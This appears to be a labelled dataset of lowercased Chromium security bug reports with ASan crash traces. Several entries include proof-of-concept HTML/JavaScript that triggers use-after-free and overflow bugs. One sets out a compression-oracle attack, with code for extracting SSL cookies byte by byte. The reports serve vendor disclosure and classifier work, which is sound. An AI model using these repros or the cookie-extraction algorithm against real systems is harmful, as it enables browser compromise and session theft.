heap-use-after-free in skcanvas updatedevicecmcache detailed report fuzzer cris_inferno_crash_url crash type heap-use-after-free read 1 crash address crash state crash stack skcanvas updatedevicecmcache skcanvas gettopdevice free stack webpluginproxy createdibandcanvasfromhandle webpluginproxy setwindowlessbuffers	11
uaf in domcontentloaded vulnerability details i used details in chrome issue 136840 to make this issue it is possible to cause webkit to fire a readystatechange event when pdf object is removed by removing the pdf object on domcontentloaded event then it is possible to append the removed pdf object back to document which causes a use after free later version chrome version 20.0.1132.57 stable 22.0.1223.0 149174 trunk operating system ubuntu 12.04 64 bit reproduction case 1 download test.html and test1.html and host on local web server 2 open test.html on chrome 3 wait for 2 seconds 4 page will display an alert box 5 click on ok button of alert box or press escape to remove the alert box 6 chrome will display sad tab for crashes please include the following additional information type of crash tab crash state asan output 8939 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 0 in webcore element recalcstyle webcore node stylechange third_party/webkit/source/webcore/dom/node.h:716 1 in webcore element recalcstyle webcore node stylechange third_party/webkit/source/webcore/dom/element.cpp:1163 2 in webcore node nextsibling const third_party/webkit/source/webcore/dom/node.h:168 3 in animationupdateblock third_party/webkit/source/webcore/page/animation/animationcontroller.h:100 4 in webcore frameview updatelayoutandstyleifneededrecursive third_party/webkit/source/webcore/page/frameview.cpp:3181 5 in webcore focuscontroller setactive bool third_party/webkit/source/webcore/page/focuscontroller.cpp:669 6 in webkit webviewimpl setfocus bool third_party/webkit/source/webkit/chromium/src/webviewimpl.cpp:1874 7 in renderwidget webwidget const content/renderer/render_widget.h:105 8 in void dispatchtomethod renderwidget void renderwidget bool bool renderwidget void renderwidget bool tuple1 bool const base/tuple.h:546 9 in renderviewimpl onmessagereceived ipc message const content/renderer/render_view_impl.cc:961 10 in messagerouter routemessage ipc message const content/common/message_router.cc:47 11 in messagerouter onmessagereceived ipc message const content/common/message_router.cc:40 12 in childthread onmessagereceived ipc message const content/common/child_thread.cc:257 13 in ipc channelproxy context ondispatchmessage ipc message const ipc/ipc_channel_proxy.cc:257 14 in base callback void run const base/callback.h:388 15 in messageloop deferorrunpendingtask base pendingtask const base/message_loop.cc:472 16 in messageloop dowork base/message_loop.cc:648 17 in base messagepumpdefault run base messagepump delegate base/message_pump_default.cc:28 18 in messageloop runinternal base/message_loop.cc:420 19 in base runloop afterrun base/run_loop.cc:84 20 in messageloop run base/message_loop.cc:300 21 in renderermain content mainfunctionparams const content/renderer/renderer_main.cc:220 22 in content runzygote content mainfunctionparams const content contentmaindelegate content/app/content_main_runner.cc:331 23 in content runnamedprocesstypemain std basic_string char std char_traits char std allocator char const content mainfunctionparams const content contentmaindelegate content/app/content_main_runner.cc:384 24 in content contentmainrunnerimpl run content/app/content_main_runner.cc:634 25 in content contentmain int char const content contentmaindelegate content/app/content_main.cc:35 26 in chromemain chrome/app/chrome_main.cc:32 27 in main chrome/app/chrome_exe_main_gtk.cc:18 28 in libc_start_main build/buildd/eglibc-2.15/csu/libc-start.c:258 is located 28 bytes inside of 192-byte region freed by thread t0 here 0 in operator delete void 0 1 in v8 internal runtimeprofiler isenabled v8/src/runtime-profiler.h:50 2 in v8 internal globalhandles postgarbagecollectionprocessing v8 internal garbagecollector v8/src/global-handles.cc:558 3 in v8 internal heap performgarbagecollection v8 internal garbagecollector v8 internal gctracer v8/src/heap.cc:923 4 in v8 internal heap collectgarbage v8 internal allocationspace v8 internal garbagecollector char const char const v8/src/heap.cc:588 5 in v8 internal heap collectgarbage v8 internal allocationspace char const v8/src/heap-inl.h:440 6 in v8 internal v8 idlenotification int v8/src/v8.cc:194 7 in v8 v8 idlenotification int v8/src/api.cc:4309 8 in webcore v8gcforcontextdispose pseudoidletimerfired webcore timer webcore v8gcforcontextdispose third_party/webkit/source/webcore/bindings/v8/v8gcforcontextdispose.cpp:75 9 in webcore threadtimers sharedtimerfiredinternal third_party/webkit/source/webcore/platform/threadtimers.cpp:118 10 in callback base/callback.h:359 11 in base callback void run const base/callback.h:388 12 in messageloop deferorrunpendingtask base pendingtask const base/message_loop.cc:472 13 in messageloop dowork base/message_loop.cc:648 14 in base messagepumpdefault run base messagepump delegate base/message_pump_default.cc:28 15 in messageloop runinternal base/message_loop.cc:420 16 in base runloop afterrun base/run_loop.cc:84 17 in messageloop run base/message_loop.cc:300 18 in renderermain content mainfunctionparams const content/renderer/renderer_main.cc:220 19 in content runzygote content mainfunctionparams const content contentmaindelegate content/app/content_main_runner.cc:331 20 in content runnamedprocesstypemain std basic_string char std char_traits char std allocator char const content mainfunctionparams const content contentmaindelegate content/app/content_main_runner.cc:384 21 in content contentmainrunnerimpl run content/app/content_main_runner.cc:634 22 in content contentmain int char const content contentmaindelegate content/app/content_main.cc:35 23 in chromemain chrome/app/chrome_main.cc:32 24 in main chrome/app/chrome_exe_main_gtk.cc:18 25 in libc_start_main build/buildd/eglibc-2.15/csu/libc-start.c:258 previously allocated by thread t0 here 0 in operator new unsigned long 0 1 in webcore htmlembedelement create webcore qualifiedname const webcore document bool third_party/webkit/source/webcore/html/htmlembedelement.cpp:55 2 in wtf passrefptr webcore htmlembedelement leakref const third_party/webkit/source/wtf/wtf/passrefptr.h:104 3 in wtf passrefptr webcore htmlelement operator webcore htmlelement wtf passrefptr webcore htmlelement const third_party/webkit/source/wtf/wtf/passrefptr.h:82 4 in wtf passrefptr webcore htmlelement leakref const third_party/webkit/source/wtf/wtf/passrefptr.h:104 5 in webcore htmltreebuilder processstarttagforinbody webcore atomichtmltoken third_party/webkit/source/webcore/html/parser/htmltreebuilder.cpp:916 6 in webcore htmltreebuilder processstarttag webcore atomichtmltoken third_party/webkit/source/webcore/html/parser/htmltreebuilder.cpp:1205 7 in webcore htmltreebuilder processtoken webcore atomichtmltoken third_party/webkit/source/webcore/html/parser/htmltreebuilder.cpp:497 8 in webcore htmlelementstack stackdepth const third_party/webkit/source/webcore/html/parser/htmlelementstack.h:79 9 in webcore atomicmarkuptokenbase webcore htmltoken clearexternalcharacters third_party/webkit/source/webcore/xml/parser/markuptokenbase.h:497 10 in webcore htmldocumentparser pumptokenizer webcore htmldocumentparser synchronousmode third_party/webkit/source/webcore/html/parser/htmldocumentparser.cpp:254 11 in webcore htmldocumentparser append webcore segmentedstring const third_party/webkit/source/webcore/html/parser/htmldocumentparser.cpp:363 12 in deque third_party/webkit/source/wtf/wtf/deque.h:370 13 in webcore documentwriter end third_party/webkit/source/webcore/loader/documentwriter.cpp:238 14 in webcore resourceerrorbase isnull const third_party/webkit/source/webcore/platform/network/resourceerrorbase.h:42 15 in webcore mainresourceloader didfinishloading double third_party/webkit/source/webcore/loader/mainresourceloader.cpp:521 16 in webkit_glue weburlloaderimpl context oncompletedrequest net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const webkit/glue/weburlloader_impl.cc:672 17 in content resourcedispatcher onrequestcomplete int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const content/common/resource_dispatcher.cc:473 18 in void dispatchtomethod content resourcedispatcher void content resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const int net urlrequeststatus std basic_string char std char_traits char std allocator char base timeticks content resourcedispatcher void content resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const tuple4 int net urlrequeststatus std basic_string char std char_traits char std allocator char base timeticks const base/tuple.h:565 19 in content resourcedispatcher dispatchmessage ipc message const content/common/resource_dispatcher.cc:543 20 in content resourcedispatcher onmessagereceived ipc message const content/common/resource_dispatcher.cc:310 21 in childthread onmessagereceived ipc message const content/common/child_thread.cc:223 22 in ipc channelproxy context ondispatchmessage ipc message const ipc/ipc_channel_proxy.cc:257	11
unknown in ogg_calc_pts detailed report fuzzer inferno_flicker crash type unknown crash address crash state crash stack ogg_calc_pts ogg_read_header avformat_open_input regressed minimized testcase 101.31 kb	7
asan reports a use-after-free in indexeddbbrowsertest.bug109187test see run indexeddbbrowsertest.bug109187test 4941:4941:0813/033052:1860087873 warning zygote_host_impl_linux.cc 146 running without the suid sandbox see for more information on developing with the sandbox on xlib extension glx missing on display 9.0 4941:4941:0813/033052:1860108477 error gl_surface_glx.cc 57 glxqueryversion failed 4941:4941:0813/033052:1860108546 error gl_surface_linux.cc 58 glsurfaceglx initializeoneoff failed 4941:4941:0813/033052:1860108577 error compositor.cc 79 could not load the gl bindings 4941:4941:0813/033052:1860145741 error proxy_service.cc 1413 proxyconfigservice for chromeos should be created in profile_io_data.cc createproxyconfigservice and this should be used only for examples 4941:4951:0813/033052:1860146877 warning proxy_service.cc 966 pac support disabled because there is no system implementation xlib extension randr missing on display 9.0 xlib extension randr missing on display 9.0 4941 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t8 0 in quota clientusagetracker gatherusagetaskbase getusagefororigins std set gurl std less gurl std allocator gurl const quota storagetype 0 1 in fileapi anonymous namespace didgetorigins base callback void std set gurl std less gurl std allocator gurl const quota storagetype const std set gurl std less gurl std allocator gurl quota storagetype webkit/fileapi/file_system_quota_client.cc:0 2 in base anonymous namespace posttaskandreplyrelay runreplyandselfdestruct base/threading/post_task_and_reply_impl.cc:0 3 in messageloop runtask base pendingtask const 0 4 in messageloop deferorrunpendingtask base pendingtask const 0 5 in messageloop dowork 0 6 in base messagepumplibevent run base messagepump delegate 0 7 in messageloop runinternal 0 8 in base runloop run 0 9 in messageloop run 0 10 in content browserthreadimpl iothreadrun messageloop 0 11 in content browserthreadimpl run messageloop 0 12 in base thread threadmain 0 13 in base anonymous namespace threadfunc void base/threading/platform_thread_posix.cc:0 14 in asan asanthread threadstart 0 is located 128 bytes inside of 352-byte region freed by thread t8 here 0 in operator delete void 0 1 in quota usagetracker usagetracker 0 2 in quota usagetracker usagetracker 0 3 in quota quotamanager quotamanager 0 4 in quota quotamanager quotamanager 0 5 in messageloop runtask base pendingtask const 0 6 in messageloop deferorrunpendingtask base pendingtask const 0 7 in messageloop dowork 0 8 in base messagepumplibevent run base messagepump delegate 0 9 in messageloop runinternal 0 10 in base runloop run 0 11 in messageloop run 0 12 in content browserthreadimpl iothreadrun messageloop 0 13 in content browserthreadimpl run messageloop 0 14 in base thread threadmain 0 15 in base anonymous namespace threadfunc void base/threading/platform_thread_posix.cc:0 16 in asan asanthread threadstart 0 previously allocated by thread t8 here 0 in operator new unsigned long 0 1 in quota usagetracker usagetracker std list quota quotaclient std allocator quota quotaclient const quota storagetype quota specialstoragepolicy 0 2 in quota quotamanager lazyinitialize 0 3 in quota quotamanager notifystorageaccessedinternal quota quotaclient id gurl const quota storagetype base time 0 4 in quota quotamanagerproxy notifystorageaccessed quota quotaclient id gurl const quota storagetype 0 5 in messageloop runtask base pendingtask const 0 6 in messageloop deferorrunpendingtask base pendingtask const 0 7 in messageloop dowork 0 8 in base messagepumplibevent run base messagepump delegate 0 9 in messageloop runinternal 0 10 in base runloop run 0 11 in messageloop run 0 12 in content browserthreadimpl iothreadrun messageloop 0 13 in content browserthreadimpl run messageloop 0 14 in base thread threadmain 0 15 in base anonymous namespace threadfunc void base/threading/platform_thread_posix.cc:0 16 in asan asanthread threadstart 0 thread t8 created by t0 here 0 in interceptor_pthread_create 0 1 in base anonymous namespace createthread unsigned long bool base platformthread delegate unsigned long base threadpriority base/threading/platform_thread_posix.cc:0 2 in base platformthread create unsigned long base platformthread delegate unsigned long 0 3 in base thread startwithoptions base thread options const 0 4 in content browsermainloop createthreads 0 5 in anonymous namespace browsermainrunnerimpl initialize content mainfunctionparams const content/browser/browser_main_runner.cc:0 6 in browsermain content mainfunctionparams const 0 7 in browsertestbase setup 0 8 in content contentbrowsertest setup 0 9 in testing test run 0 10 in testing testinfo run 0 11 in testing testcase run 0 12 in testing internal unittestimpl runalltests 0 13 in testing unittest run 0 14 in base testsuite run 0 15 in content contenttestlauncherdelegate runtestsuite int char 0 16 in test_launcher launchtests test_launcher testlauncherdelegate int char 0 17 in main 0 18 in libc_start_main build/buildd/eglibc-2.11.1/csu/libc-start.c:258 4941 aborting stats 22m malloced 16m for red zones by 27274 calls stats 0m realloced by 420 calls stats 20m freed by 18884 calls stats 0m really freed by 0 calls stats 72m 18445 full pages mmaped in 18 calls mmaps by size class 8:32766 9:8191 10:4095 11:2047 12:1024 13:512 14:512 15:128 16:128 17:32 19:8 21:4 22:2 mallocs by size class 8:22156 9:2607 10:1097 11:696 12:229 13:36 14:309 15:26 16:102 17:9 19:2 21:3 22:2 frees by size class 8:14731 9:1999 10:934 11:602 12:170 13:23 14:301 15:18 16:99 19:2 21:3 22:2 rfrees by size class stats malloc large 16 small slow 221 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa	11
heap-use-after-free in webcore elementv8internal onclickattrgetter repro-file as attachment reproduces clean on my machines chrome version asan chromium 23.0.1240.0 asan-report 3559 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore elementv8internal onclickattrgetter v8 local v8 string v8 accessorinfo const gen/webkit/bindings/v8derivedsources03.cpp:0 1 in v8 internal jsobject getpropertywithcallback v8 internal object v8 internal object v8 internal string 0 2 in v8 internal loadic load v8 internal inlinecachestate v8 internal handle v8 internal object v8 internal handle v8 internal string 0 3 in v8 internal loadic_miss v8 internal arguments v8 internal isolate 0	11
heap-use-after-free in webcore svgtrefelement updatereferencedtext vulnerability details use-after-free in webcore svgtrefelement updatereferencedtext version chrome version dev operating system linux 64bit reproduction case html head style style script onload function document.body.appendchild document.createelement input el0=document.createelementns svg document.body.appendchild el0 el1=document.createelementns g el0.appendchild el1 el2=document.createelementns tref el2.setattributens xlink href el3 el1.appendchild el2 document.body.appendchild document.createelement input el3=document.createelementns g el3.setattribute id el3 el1.appendchild el3 document.designmode='on document.execcommand selectall document.execcommand formatblock false pre document.execcommand undo document.execcommand italic el3.setattribute x y script head body body html for crashes please include the following additional information type of crash asan renderer crash state 1450 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore svgtrefelement updatereferencedtext 0 1 in webcore eventtarget fireeventlisteners webcore event webcore eventtargetdata wtf vector webcore registeredeventlistener 1ul 0 is located 32 bytes inside of 512-byte region freed by thread t0 here 0 in operator delete void 0 1 in webcore containernode removeallchildren 0 2 in webcore containernode containernode 0	11
security memory address disclosure through javascript in print preview webui every once in a while i actually read through the security bugs and i saw bug 134519 print preview is guilty of the same issue that affected the cookies page in bug 134519 i ve been meaning to fix this for a while vulnerability details in the print preview js raw printpreviewui pointer addresses are exposed version chrome version all current versions in release 21-23 and older releases as well operating system all os	11
tracking bug for fixing rel=noreferrer aslr bypass opening this to track the various stages to fix the aslr bypass that exists given the ability to create infinite numbers of processes to brute force memory addresses related to webkit bug i ll list the various patches that need to be merged to m22 as they land consumable user gestures landed on webkit as	2
heap-double-free in xmlfreenodelist detailed report fuzzer cris_inferno_crash_url crash type heap-double-free crash address crash state crash stack xmlfreenodelist xmlfreeprop free stack xmlfreenodelist xmlfreeprop minimized testcase 0.11 kb	7
skpaint skpaint crash crashes on windows dev 23.0.1243.2 153013 and canary 23.0.1245.0 153342 repro crash1.html style webkit-keyframes kf0 to webkit-mask webkit-radial-gradient 000 000 style video src foo foo video span style webkit-animation kf0 1s 1s backwards iframe style webkit-mask-box-image webkit-radial-gradient fff fff 2df0.e98 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=0027dda8 ebx=01c65738 ecx=3ff00004 edx=00000001 esi=0027eb8c edi=0027ebd4 eip=56ef5104 esp=0027dd8c ebp=0027dd8c iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202 chrome_56e90000 skpaint skpaint 56ef5104 f00fc111 lock xadd dword ptr ecx edx ds:0023:3ff00004 exceptionaddress 56ef5104 chrome_56e90000 skpaint skpaint exceptioncode c0000005 access violation exceptionflags 00000000 numberparameters 2 parameter 0 00000001 parameter 1 3ff00004 attempt to write to address 3ff00004 childebp retaddr 0027dd8c 576a9507 chrome_56e90000 skpaint skpaint 0027de0c 57068479 chrome_56e90000 webcore opaqueregionskia popcanvaslayer 0027df24 57067bd7 chrome_56e90000 webcore renderlayer paintlayercontents 0027df58 57067a12 chrome_56e90000 webcore renderlayer paintlayercontentsandreflection 0027e174 570692c8 chrome_56e90000 webcore renderlayer paintlayer 0027e1b0 570682b8 chrome_56e90000 webcore renderlayer paintlist 0027e2e4 57067bd7 chrome_56e90000 webcore renderlayer paintlayercontents 0027e318 57067a12 chrome_56e90000 webcore renderlayer paintlayercontentsandreflection 0027e534 570692c8 chrome_56e90000 webcore renderlayer paintlayer 0027e570 570682b8 chrome_56e90000 webcore renderlayer paintlist 0027e6a4 57067bd7 chrome_56e90000 webcore renderlayer paintlayercontents 0027e6d8 57067a12 chrome_56e90000 webcore renderlayer paintlayercontentsandreflection 0027e8f4 57067503 chrome_56e90000 webcore renderlayer paintlayer 0027e96c 57066f1b chrome_56e90000 webcore renderlayer paint 0027e9d4 582615fb chrome_56e90000 webcore frameview paintcontents 0027ea04 582744ea chrome_56e90000 webkit webviewimpl paintrootlayer 0027ea40 5767fbc2 chrome_56e90000 webkit noncompositedcontenthost paintcontents 0027ea88 576839f8 chrome_56e90000 webcore graphicslayer paintgraphicslayercontents 0027ea98 576af5fd chrome_56e90000 webcore graphicslayerchromium paint 0027ed38 582889df chrome_56e90000 webcore opaquerecttrackingcontentlayerdelegate paintcontents 0027ed74 579918ce chrome_56e90000 webkit webcontentlayerimpl paintcontents 0027eda4 56f8ed6e chrome_56e90000 webcore contentlayerpainter paint 0027ede4 56ef102f chrome_56e90000 webkit_glue webkitplatformsupportimpl monotonicallyincreasingtime 0027ee1c 56e94940 chrome_56e90000 skmetadata setptr 0027ee34 00000000 chrome_56e90000 tcmalloc threadcache deallocate	11
security integer overflow in gpu process with webgl vulnerability details integer overflow in gpu process with webgl this might be an asan bug chromium and chrome say error gles2_cmd_decoder.cc 5133 webglrenderingcontext gl error gl_invalid_value gltexsubimage2d bad dimensions version chrome version dev operating system linux 64bit reproduction case html head script var gl document.createelement canvas getcontext experimental-webgl var texture gl.createtexture gl.bindtexture gl.texture_2d texture gl.teximage2d gl.texture_2d 0 gl.rgba 256 256 0 gl.rgba gl.unsigned_byte null gl.texsubimage2d gl.texture_2d 0 0 256 256 gl.rgba gl.unsigned_byte new uint8array 256 256 4 script head html same problem with the large number in the x position for crashes please include the following additional information type of crash asan gpu crash state 2978 error addresssanitizer unknown-crash on address at pc bp sp read of size 1 at thread t0 0 in interceptor_memcpy 0 1 in 0 2978 addresssanitizer check failed usr/local/google/chrome/src/third_party/llvm/projects/compiler-rt/lib/asan/asan_report.cc:136 0 address is not in memory and not in shadow 0 0 in sanitizer checkfailed char const int char const unsigned long long unsigned long long 0 1 in asan describeaddressifshadow unsigned long 0	11
security ssl compression infoleak vulnerability details 1 introduction it s a known vulnerablity that combining compression with encryption can sometimes reveal information that would not have been revealed without compression 1 we ve developed working exploits for this vulnerablity in chrome s implementation of ssl/tls compression there are two attacks both can reliably extract cookies just by using javascript to create new img tags pointed to target domain looking at the lengths of the resulting ssl/tls compressed records it s worth noting that our attacks do n't require any plugins we use javascript to make them faster but it s possible to implement them even without any scripting capabilities 2 first attack two tries suppose that the cookie name is sid and we want to obtain the first byte of its value which is supposed to be the byte a the first attack which we call two tries works as follows for each byte guesschar in the cookie s characterset it constructs two urls using this function guess_len 4 window_len 2 15 262 zlib s default window size see pad_byte req http/1.1\r\nhost localhost:8443\r\nconnection keep-alive\r\nuser-agent mozilla/5.0 x11 linux x86_64 applewebkit/537.1 khtml like gecko chrome/21.0.1180.15 safari/537.1\r\naccept r\nreferer gzip deflate sdch\r\naccept-language en-us en q=0.8\r\naccept-charset iso-8859-1 utf-8 q=0.7 q=0.3\r\ncookie def two_guess known guesschar guess known guess_len-1 guesschar id=x boundary pad_byte guess_len url1 guess boundary url2 boundary guess total_pad window_len len req len known 5 1 5 for get and 1 for the guesschar padding pad_byte total_pad url1 padding url2 padding return url1 url2 where known is sid the trick here is to make sure that guess is out of zlib s window size in url1 but not so in url2 these two urls are then used to open new cookie-bearing requests to target e.g setting them as image sources here is our oracle when guess is n't equal to id=a compressed lengths of both requests would be the same when guess is equal to id=a compressed lengths of both requests would be different this happens because the string id=a in cookie would be replaced by a reference to the same string in the url2 we found that this oracle is reliably enough to extract cookies 2 second attack 16k-1 we found that if a request is larger than ssl s maximum record size 2^14 16k chrome would divide it into multiple records and compress each of them in zlib s z_sync_flush mode with this observation the second attack which we call 16k-1 constructs urls using the following function record_len 2 14 def random_url known url random_str 100 padding_len record_len len url len req len known 5 1 5 for get and 1 to make room for the first unknown byte url padding_len pad_byte assert len url record_len len req len known 5 1 return url the trick here is to generate a request larger than 2 14 and make sure that its first record consists of 16k-1 known bytes e.g get random str padding boring request headers 1 unknown cookie byte this url is then used to obtain the next unknown cookie byte using this simple algorithm def compress bytes compressor zlib.compressobj return compressor.compress bytes compressor.flush zlib.z_sync_flush def next_byte cookie known alphabet=base64 good alphabet while len good 1 url random_url known record_lens query url ask browser to send request and sniff to obtain records lengths length record_lens 0 size of the first record record get s s s url req known for c in good if len compress record c length good.remove c return good 0 this attack is 100 reliable 3 possible solutions randomize zlib s deflate you probably ca n't use random padding inside deflate because that would break servers but you can still add a random number of zlib s empty stored blocks use a randomized lz77 algorithm with a random window size this wo n't stop both attacks just make them slower compress-then-split the plaintext into ssl records rather than the current approach we do n't know if this would break any ssl servers but this will stop the second attack 1 section-7	4
heap-use-after-free in media audiooutputdevice audiothreadcallback process repro-file as attachment chrome version chromium 23.0.1261.0 asan-output 2049 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t546 2049 addresssanitizer while reporting a bug found another one.ignoring 0 in media audiooutputdevice audiothreadcallback process int 0 1 in media audiodevicethread thread run 0 2 in media audiodevicethread thread threadmain 0 3 in base anonymous namespace threadfunc void base/threading/platform_thread_posix.cc:0 4 in asan asanthread threadstart 0 is located 16 bytes inside of 296-byte region freed by thread t399 here 2049 addresssanitizer while reporting a bug found another one.ignoring 0 in operator delete void 0 1 in media pipeline finishdestroyingfilterstask 0 2 in media pipeline teardownstatetransitiontask 0 3 in messageloop runtask base pendingtask const 0 4 in messageloop deferorrunpendingtask base pendingtask const 0 5 in messageloop dowork 0	11
heap-buffer-overflow in ucstrtextextract vulnerability details heap buffer overflow happens in web database regexp while trying to report regular expression rule parsing error version version 23.0.1264.0 156197 ubuntu x64 could not reproduce with the same repro on stable versions of mac and windows and on windows canary but it seems that the bug is also present in windows 23.0.1263.1 canary because while running the same regexp-fuzzer crash happens with the similar stack see below probably it just requires regexp modification ps at the moment i am unable to build chrome currently using public builds so asan log is not full but it reproduces on linux for me very well reproduction case script var db opendatabase test 1.0 aaaa 1024 db.transaction function h h.executesql create table if not exists tableaaaa text h.executesql insert into tableaaaa values aaaa db.transaction function h h.executesql select from tableaaaa where text regexp script for crashes please include the following additional information 25987 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 2 at thread t4 0 in ucstrtextextract b/build/slave/asan_release__symbolized_/build/third_party/icu/source/common/utext.cpp:2882 1 in icu_46 regexcompile error uerrorcode b/build/slave/asan_release__symbolized_/build/third_party/icu/source/i18n/regexcmp.cpp:3604 2 in icu_46 regexcompile doparseactions int b/build/slave/asan_release__symbolized_/build/third_party/icu/source/i18n/regexcmp.cpp:1740 3 in icu_46 regexcompile compile utext uparseerror uerrorcode b/build/slave/asan_release__symbolized_/build/third_party/icu/source/i18n/regexcmp.cpp:221 4 in icu_46 regexpattern compile utext unsigned int uparseerror uerrorcode b/build/slave/asan_release__symbolized_/build/third_party/icu/source/i18n/repattrn.cpp:360 5 in icu_46 regexpattern compile utext unsigned int uerrorcode b/build/slave/asan_release__symbolized_/build/third_party/icu/source/i18n/repattrn.cpp:416 6 in 7 in 8 in 9 in 10 in 11 in 12 in 13 in 14 in 15 in 16 in 17 in 18 in 19 in 20 in 21 in is located 28 bytes to the left of 8-byte region allocated by thread t4 here 0 in 1 in 2 in 3 in 4 in 5 in 6 in 7 in 8 in 9 in 10 in 11 in 12 in 13 in 14 in 15 in 16 in thread t4 created by t0 here 0 in 1 in 2 in 3 in 4 in 5 in 6 in 7 in 8 in 9 in 10 in 11 in 12 in 13 in 14 in 15 in 16 in 17 in 18 in 19 in 20 in 21 in 22 in 23 in 24 in 25 in 26 in 27 in 28 in 29 in 30 in 31 in 32 in 33 in 34 in 35 in 36 in 37 in 38 in 39 in 40 in 41 in 42 in 43 in 44 in 45 in 46 in 47 in 48 in 49 in 50 in 51 in 52 in 53 in 54 in 55 in libc_start_main build/buildd/eglibc-2.12.1/csu/libc-start.c:226 shadow byte and word fa fa fa fa fa fa fa fa fa more shadow bytes fa fa fa fa fa fa fa fa 04 fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa stats 9m malloced 9m for red zones by 17490 calls stats 1m realloced by 472 calls stats 7m freed by 10034 calls stats 0m really freed by 0 calls stats 52m 13321 full pages mmaped in 13 calls mmaps by size class 8:16383 9:8191 10:4095 11:2047 12:1024 13:512 14:256 15:128 16:128 17:32 18:16 19:8 mallocs by size class 8:13918 9:896 10:1832 11:309 12:181 13:51 14:152 15:37 16:108 17:4 18:1 19:1 frees by size class 8:7201 9:444 10:1727 11:192 12:154 13:40 14:140 15:30 16:101 17:3 18:1 19:1 rfrees by size class stats malloc large 6 small slow 159 25987 aborting windbg 0:009 x86 kp childebp retaddr 0493f32c 562ff6f9 chrome_55190000 ucstrtextextract struct utext ut int64 start 0n-9 int64 limit 0n6 wchar_t dest int destcapacity 0n16 uerrorcode perrorcode c b\build\slave\win\build\src\third_party\icu\source\common\utext.cpp 2871 0493f354 562c5178 chrome_55190000 utext_extract_46 struct utext ut int64 start 0n-9 int64 limit 0n6 wchar_t dest int destcapacity 0n16 uerrorcode status c b\build\slave\win\build\src\third_party\icu\source\common\utext.cpp 423 0493f388 562c8165 chrome_55190000 icu_46 regexcompile error uerrorcode e u_zero_error 0n0 c b\build\slave\win\build\src\third_party\icu\source\i18n\regexcmp.cpp 3605 0493f3d8 562c840f chrome_55190000 icu_46 regexcompile doparseactions int action 0n6 c b\build\slave\win\build\src\third_party\icu\source\i18n\regexcmp.cpp 1732 0493f3f0 562bace7 chrome_55190000 icu_46 regexcompile compile struct utext pat struct uparseerror pp uerrorcode e c b\build\slave\win\build\src\third_party\icu\source\i18n\regexcmp.cpp 221 0493f5b4 562bad4e chrome_55190000 icu_46 regexpattern compile struct utext regex unsigned int flags 0 struct uparseerror pe uerrorcode status c b\build\slave\win\build\src\third_party\icu\source\i18n\repattrn.cpp 362 0493f618 562b869a chrome_55190000 icu_46 regexpattern compile struct utext regex unsigned int flags 0 uerrorcode err c b\build\slave\win\build\src\third_party\icu\source\i18n\repattrn.cpp 417 0493f6b4 5628d215 chrome_55190000 uregex_open_46 wchar_t pattern 4-0 e-kd-t 1 b8-86-1 3 int patternlength 0n-1 unsigned int flags 0 struct uparseerror pe uerrorcode status c b\build\slave\win\build\src\third_party\icu\source\i18n\uregex.cpp 156 0493f6e0 55374b1d chrome_55190000 icuregexpfunc struct sqlite3_context p int narg 0n2 struct mem aparg c b\build\slave\win\build\src\third_party\sqlite\amalgamation\sqlite3.c 125765 0493f820 55373e5c chrome_55190000 sqlite3vdbeexec struct vdbe p c b\build\slave\win\build\src\third_party\sqlite\amalgamation\sqlite3.c 63843 0493f840 55373c3b chrome_55190000 sqlite3step struct vdbe p c b\build\slave\win\build\src\third_party\sqlite\amalgamation\sqlite3.c 60869 0493f920 55ec7380 chrome_55190000 sqlite3_step struct sqlite3_stmt pstmt c b\build\slave\win\build\src\third_party\sqlite\amalgamation\sqlite3.c 60935 0493f930 55f3f21b chrome_55190000 webcore sqlitestatement step void c b\build\slave\win\build\src\third_party\webkit\source\webcore\platform\sql\sqlitestatement.cpp 105 0493f988 55b1baa2 chrome_55190000 webcore sqlstatement execute type information missing error db type information missing error c b\build\slave\win\build\src\third_party\webkit\source\webcore\modules\webdatabase\sqlstatement.cpp 116 0493f998 55b1b957 chrome_55190000 webcore sqltransaction runcurrentstatement void c b\build\slave\win\build\src\third_party\webkit\source\webcore\modules\webdatabase\sqltransaction.cpp 401 0493f9ac 55a737a8 chrome_55190000 webcore sqltransaction runstatements void c b\build\slave\win\build\src\third_party\webkit\source\webcore\modules\webdatabase\sqltransaction.cpp 372 0493f9b8 55abc2b6 chrome_55190000 webcore database databasetransactiontask doperformtask void c b\build\slave\win\build\src\third_party\webkit\source\webcore\modules\webdatabase\databasetask.cpp 157 0493fa04 55abc23c chrome_55190000 webcore databasethread databasethread c b\build\slave\win\build\src\third_party\webkit\source\webcore\modules\webdatabase\databasethread.cpp 107 0493fa10 56b2c3d3 chrome_55190000 webcore databasethread databasethreadstart c b\build\slave\win\build\src\third_party\webkit\source\webcore\modules\webdatabase\databasethread.cpp 94 0493fa2c 5649fb15 chrome_55190000 wtf threadentrypoint void contextdata c b\build\slave\win\build\src\third_party\webkit\source\wtf\wtf\threading.cpp 69 0493fa40 55263184 chrome_55190000 wtf wtfthreadentrypoint c b\build\slave\win\build\src\third_party\webkit\source\wtf\wtf\threadingwin.cpp 217 0493fa78 55263148 chrome_55190000 callthreadstartex void f dd\vctools\crt_bld\self_x86\crt\src\threadex.c 314 0493fa84 